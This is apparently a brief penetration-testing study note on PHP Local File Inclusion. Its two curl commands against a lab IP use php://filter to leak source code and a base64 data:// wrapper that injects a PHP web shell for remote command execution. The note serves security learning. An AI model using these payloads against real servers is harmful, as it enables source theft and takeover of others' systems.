---
description: >-
  LFI differs from Directory Traversal because the file is getting executed so
  it can be leveraged to remote code execution.
---

# Local File Inclusion (LFI)

### PHP Wrappers

using base64 encode + resource to display source codes:

```bash
curl -i 'http://192.168.227.16/meteor/index.php?page=php://filter/convert.base64-encode/resource=../backup.php'
```

using base64 decode + data filter for RCE

```bash
curl -i 'http://192.168.227.16/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls'
```
